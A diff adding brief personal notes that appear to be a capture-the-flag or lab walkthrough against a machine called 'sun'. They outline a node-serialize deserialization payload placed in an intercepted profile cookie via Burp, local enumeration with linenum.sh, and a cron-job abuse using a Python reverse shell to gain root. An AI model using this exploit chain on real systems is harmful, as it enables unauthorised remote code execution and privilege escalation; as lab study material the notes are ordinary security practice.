@@ -1,0 +1,12 @@
+Get shell:
+burp--> intercept on --> get --> repeater --> replace profile=:
+ 
+{"rce":"_$$ND_FUNC$$_function()
+generate by nodejsshell.py
+()"}
+
+run linenum.sh
+
+Check CRON job status and use python_reverse_shell:
+
+root@sun:/var/log# tail -10 syslog
